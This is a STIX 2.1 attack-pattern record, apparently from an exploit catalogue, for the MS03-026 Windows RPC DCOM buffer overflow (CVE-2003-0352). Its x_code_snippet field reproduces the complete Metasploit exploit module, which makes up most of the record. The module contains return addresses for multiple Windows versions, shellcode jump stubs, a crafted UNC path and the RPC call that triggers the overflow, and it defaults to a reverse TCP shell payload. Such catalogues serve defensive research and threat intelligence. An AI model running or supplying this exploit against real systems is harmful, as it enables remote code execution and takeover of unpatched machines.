{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0c0e96bf-9026-4b96-84d3-ad7d35173aa1",
    "created": "2024-08-14T16:39:40.031766Z",
    "modified": "2024-08-14T16:39:40.03177Z",
    "name": "MS03-026 Microsoft RPC DCOM Interface Overflow",
    "description": " This module exploits a stack buffer overflow in the RPCSS service, this vulnerability was originally found by the Last Stage of Delirium research group and has been widely exploited ever since. This module can exploit the English versions of Windows NT 4.0 SP3-6a, Windows 2000, Windows XP, and Windows 2003 all in one request :) ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/dcerpc/ms03_026_dcom.rb",
            "external_id": "ms03_026_dcom.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0352"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::DCERPC\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MS03-026 Microsoft RPC DCOM Interface Overflow',\n        'Description' => %q{\n          This module exploits a stack buffer overflow in the RPCSS service, this vulnerability\n          was originally found by the Last Stage of Delirium research group and has been\n          widely exploited ever since. This module can exploit the English versions of\n          Windows NT 4.0 SP3-6a, Windows 2000, Windows XP, and Windows 2003 all in one request :)\n        },\n        'Author' => [ 'hdm', 'spoonm', 'cazz' ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2003-0352' ],\n          [ 'OSVDB', '2100' ],\n          [ 'MSB', 'MS03-026' ],\n          [ 'BID', '8205' ],\n        ],\n        'Privileged' => true,\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread',\n          'PAYLOAD' => 'windows/shell/reverse_tcp'\n        },\n        'Payload' => {\n          'Space' => 880,\n          'MinNops' => 300,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\",\n          'StackAdjustment' => -3500\n        },\n        'Platform' => %w[win],\n        'Targets' => [\n          # Target 0: Universal\n          [\n            'Windows NT SP3-6a/2000/XP/2003 Universal',\n            {\n              'Platform' => 'win',\n              'Rets' =>\n                [\n                  0x77f33723, # Windows NT 4.0 SP6a (esp)\n                  0x7ffde0eb, # Windows 2000 writable address + jmp+0xe0\n                  0x010016c6, # Windows 2000 Universal (ebx)\n                  0x01001c59, # Windows XP SP0/SP1 (pop pop ret)\n                  0x001b0b0b, # Windows 2003 call near [ebp+0x30] (unicode.nls - thanks Litchfield!)\n                  0x776a240d, # Windows NT 4.0 SP5 (eax) ws2help.dll\n                  0x74ff16f3, # Windows NT 4.0 SP3/4 (pop pop ret) rnr20.dll\n                ]\n            },\n          ],\n        ],\n        'Notes' => {\n          'Stability' => [ CRASH_SERVICE_DOWN ],\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2003-07-16'\n      )\n    )\n  end\n\n  # don't bother with this module for autoexploitation, it creates\n  # false-positives on newer systems.\n  def autofilter\n    false\n  end\n\n  def check\n    begin\n      connect\n    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\n      return CheckCode::Safe(\"SMB error: #{e.message}\")\n    end\n\n    handle = dcerpc_handle('4d9f4ab8-7d1c-11cf-861e-0020af6e7c57', '0.0', 'ncacn_ip_tcp', [rport])\n\n    begin\n      dcerpc_bind(handle)\n    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\n      return CheckCode::Safe(\"SMB error: #{e.message}\")\n    end\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    connect\n    print_status(\"Trying target #{target.name}...\")\n\n    handle = dcerpc_handle('4d9f4ab8-7d1c-11cf-861e-0020af6e7c57', '0.0', 'ncacn_ip_tcp', [rport])\n\n    print_status(\"Binding to #{handle} ...\")\n\n    begin\n      dcerpc_bind(handle)\n    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\n      fail_with(Failure::NotVulnerable, \"SMB error: #{e.message}\")\n    end\n\n    # Carefully create the combination of addresses and code for cross-os exploitation\n    xpseh = rand_text_alphanumeric(360, payload_badchars)\n\n    # Jump to [esp-4] - (distance to shellcode)\n    jmpsc =\n      \"\\x8b\\x44\\x24\\xfc\" +           # mov eax,[esp-0x4]\n      \"\\x05\\xe0\\xfa\\xff\\xff\" +       # add eax,0xfffffae0 (sub eax, 1312)\n      Rex::Arch::X86.jmp_reg('eax')  # jmp eax\n\n    # Jump to [ebp+0x30] - (distance to shellcode) - thanks again Litchfield!\n    jmpsc2k3 =\n      \"\\x8b\\x45\\x30\" +               # mov eax,[ebp+0x30]\n      \"\\x05\\x24\\xfb\\xff\\xff\" +       # add eax,0xfffffb24 (sub 1244)\n      Rex::Arch::X86.jmp_reg('eax')  # jmp eax\n\n    # Windows 2003 added by spoonm\n    xpseh[246 - jmpsc2k3.length, jmpsc2k3.length] = jmpsc2k3\n    xpseh[246, 2] = Rex::Arch::X86.jmp_short(\"$-#{jmpsc2k3.length}\")\n    xpseh[250, 4] = [ target['Rets'][4] ].pack('V')\n\n    xpseh[306, 2] = Rex::Arch::X86.jmp_short('$+8')\n    xpseh[310, 4] = [ target['Rets'][3] ].pack('V')\n    xpseh[314, jmpsc.length] = jmpsc\n\n    #\n    # NT 4.0 SP3/SP4 work the same, just use a pop/pop/ret that works on both\n    # NT 4.0 SP5 is a jmp eax to avoid a conflict with SP3/SP4\n    # HD wrote NT 4.0 SP6a, and it's off in a different place\n    #\n    # Our NT 4.0 SP3/SP4/SP5 overwrites will look something like this:\n    # (hopefully I'm accurate, this is from my memory...)\n    #\n    # |---pop pop ret--------        --eax---|\n    # V                     |        |       V\n    # [ jmp +17 ] [ ret sp3/4 ] [ ret sp5 ] [ jmpback sp5 ] [ jmpback sp3/4 ]\n    #     4             4           4              5               5\n    #     |                                                 ^\n    #     --------------------------------------------------|\n    # The jmpback's all are 5 byte backwards jumps into our shellcode that\n    # sits just below these overwrites...\n    #\n\n    nt4sp3jmp = Rex::Arch::X86.jmp_short(\"$+#{12 + 5}\") +\n                rand_text(2, payload_badchars)\n\n    nt4sp5jmpback = \"\\xe9\" + [ ((5 + 4 + payload.encoded.length) * -1) ].pack('V')\n    nt4sp3jmpback = \"\\xe9\" + [ ((12 + 5 + 5 + payload.encoded.length) * -1) ].pack('V')\n    ntshiz =\n      nt4sp3jmp +\n      [ target['Rets'][6] ].pack('V') +\n      [ target['Rets'][5] ].pack('V') +\n      nt4sp5jmpback +\n      nt4sp3jmpback\n\n    # Pad to the magic value of 118 bytes\n    ntshiz += rand_text(118 - ntshiz.length, payload_badchars)\n\n    # Create the evil UNC path used in the overflow\n    uncpath =\n      Rex::Text.to_unicode('\\\\\\\\') +\n      make_nops(32) +\n\n      # When attacking NT 4.0, jump over 2000/XP return\n      Rex::Arch::X86.jmp_short(16) +\n      Rex::Arch::X86.jmp_short(25) +\n      [ target['Rets'][2] ].pack('V') +   # Return address for 2000 (ebx)\n      [ target['Rets'][0] ].pack('V') +   # Return address for NT 4.0 SP6 (esi)\n      [ target['Rets'][1] ].pack('V') +   # Writable address on 2000 and jmp for NT 4.0\n      make_nops(88) +\n      Rex::Arch::X86.jmp_short(4) +\n      rand_text(4, payload_badchars) +\n      make_nops(8) +\n      Rex::Arch::X86.jmp_short(4) +\n      Rex::Arch::X86.jmp_short(4) +\n      make_nops(4) +\n      Rex::Arch::X86.jmp_short(4) +\n      rand_text(4, payload_badchars) +\n      payload.encoded +\n      ntshiz +\n      xpseh +\n      Rex::Text.to_unicode(\"\\\\\\x00\")\n\n    # This is the rpc cruft needed to trigger the vuln API\n    stubdata =\n      NDR.short(5) +\n      NDR.short(1) +\n      NDR.long(0) +\n      NDR.long(0) +\n      rand_text(16) +\n      NDR.long(0) +\n      NDR.long(0) +\n      NDR.long(0) +\n      NDR.long(0) +\n      NDR.long(0) +\n      NDR.long(rand(0xFFFFFFFF)) +\n      NDR.UnicodeConformantVaryingStringPreBuilt(uncpath) +\n      NDR.long(0) +\n      NDR.long(rand(0xFFFFFFFF)) +\n      NDR.long(rand(0xFFFFFFFF)) +\n      NDR.long(1) +\n      NDR.long(rand(0xFFFFFFFF)) +\n      NDR.long(1) +\n      NDR.long(rand(0xFFFFFFFF)) +\n      NDR.long(rand(0xFFFFFFFF)) +\n      NDR.long(rand(0xFFFFFFFF)) +\n      NDR.long(rand(0xFFFFFFFF)) +\n      NDR.long(1) +\n      NDR.long(1) +\n      NDR.long(rand(0xFFFFFFFF))\n\n    print_status(\"Calling DCOM RPC with payload (#{stubdata.length} bytes) ...\")\n\n    begin\n      dcerpc_call(0, stubdata, nil, false)\n    rescue StandardError => e\n      raise e unless e.to_s.include?('STATUS_PIPE_DISCONNECTED')\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-07-16",
    "x_mitre_platforms": [
        "win'"
    ]
}